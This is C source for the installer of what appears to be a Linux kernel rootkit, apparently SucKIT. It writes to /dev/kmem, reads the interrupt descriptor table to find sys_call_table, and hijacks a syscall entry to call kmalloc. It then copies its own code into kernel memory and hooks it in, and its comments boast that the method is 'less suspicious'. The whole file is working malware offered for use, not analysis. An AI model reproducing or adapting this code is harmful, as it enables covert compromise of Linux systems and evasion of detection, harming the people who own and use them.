/* 
 * $Id: install.c, huh, this does really nasty things, read
 *	the source and you will get the idea ;)
 */

#include "stuff.h"

/*
	There is a bit of neat trickery. Because Silvio's way
	of handling kmalloc() from user-space (by OVERWRITING
	syscall code) is ... ehrm ... too robust and seems to
	be causing some problems I decided to use a bit more
	tricky way. Why not to setup kmalloc() just as simple
	syscall ;) Just overwrite some unused syscall entry
	by address of kmalloc() and call that syscall
	SYSCALL(size, gfp) ... and you will get address or
	NULL if not enough memory. Eureka.

	The rest of work with kernel memory (setting up
	new sys_call_table[], repairing old one, relocating
	variables ...) is done by small routine in kernel
	(see kernel_init()#kernel.c),
	so we don't need to do this nasty work from user
	level thru /dev/kmem anymore. It's a bit more safe,
	comfortable and less suspicious.
		-sd
*/


/* kmalloc() hint */
ulong	kma_hint_lookup(ulong *buf, int count, char *name)
{
	int	l = strlen(name);
	int	i;
	char	*n;
	ulong	a = 0;

	/* try to match exactly */
	for (i = 0; i < count; i++) {
		n = (char *) (buf[i*2+1] + (ulong) buf);
		if (!strcmp(n, name)) {
			a = buf[i*2];
			break;
		}
	}

	/* revert to strncmp() */
	for (i = 0; i < count; i++) {
		n = (char *) (buf[i*2+1] + (ulong) buf);
		if (!strncmp(n, name, l)) {
			a = buf[i*2];
			break;
		}
	}

	return a;
}

#define KMH_SIZE	128*1024
ulong	get_kma_hint() {
	uchar	qbuf[KMH_SIZE];
	uchar	*kmt[] = { "kmalloc", "_kmalloc", "__kmalloc", NULL };
	int	ret, i;
	ulong	a;

	if (query_module(NULL, QM_SYMBOLS, qbuf, sizeof(qbuf), &ret) < 0)
		return 0;

	for (i = 0; kmt[i]; i++) {
		a = kma_hint_lookup((ulong *) qbuf, ret, kmt[i]);
		if (a) return a;
	}

	return 0;
}


/* this will try to install us into memory */
int	install()
{
	int		fd;
	ulong		sct;
	ulong		kmalloc;
	ulong		gfp;
	struct idtr	idtr;
	struct idt	idt80;
	ulong		oldsys;
	ulong		mem;
	ulong		size;
	ulong		sctp[2];
	ulong		old80;

	mkdir(HOME, 0644);

	fd = open(DEFAULT_KMEM, O_RDWR, 0);
	if (fd < 0) {
		printf("FUCK: Can't open %s for read/write (%d)\n", DEFAULT_KMEM,
			-fd);
		return 1;
	}

	asm ("sidt %0" : "=m" (idtr));

	printf("RK_Init: idt=0x%08x, ", (uint) idtr.base);

	if (ERR(rkm(fd, &idt80, sizeof(idt80),
		idtr.base + 0x80 * sizeof(idt80)))) {
		printf("FUCK: IDT table read failed (offset 0x%08x)\n",
			(uint) idtr.base);
		close(fd);
		return 1;
	}

	old80 = idt80.off1 | (idt80.off2 << 16);
	sct = get_sct(fd, old80, sctp);

	if (!sct) {
		printf("FUCK: Can't find sys_call_table[]\n");
		close(fd);
		return 1;
	}

	printf("sct[]=0x%08x, ", (uint) sct);

	kmalloc = (ulong) get_kma(fd, sct & 0xff000000, &gfp, get_kma_hint());
	if (!kmalloc) {
		printf("FUCK: Can't find kmalloc()!\n");
		close(fd);
		return 1;
	}
	printf("kmalloc()=0x%08x, gfp=0x%x\n", (uint) kmalloc,
		(uint) gfp);

	if (ERR(rkml(fd, &oldsys, sct + OURSYS * 4))) {
		printf("FUCK: Can't read syscall %d addr\n", OURSYS);
		close(fd);
		return 1;
	}

	wkml(fd, kmalloc, sct + OURSYS * 4);

	size = (ulong) kernel_end - (ulong) kernel_start
	        + SCT_TABSIZE + PID_TABSIZE;

	printf("Z_Init: Allocating kernel-code memory...");
	mem = KMALLOC(size, gfp);
	if (!mem) {
		wkml(fd, oldsys, sct + OURSYS * 4);
		printf("FUCK: Out of kernel memory!\n");
		close(fd);
		return 1;
	}
	wkm(fd, (void *) kernel_start,
		(ulong) kernel_end - (ulong) kernel_start,
		mem + SCT_TABSIZE);
	wkml(fd, mem + SCT_TABSIZE +
		(ulong) (kernel_init) - (ulong) kernel_start,
		sct + OURSYS * 4);
	KINIT(mem, sct, sctp, oldsys);

	printf("Done, %d bytes, base=0x%08x\n", (int) size, (uint) mem);
	return 0;
}

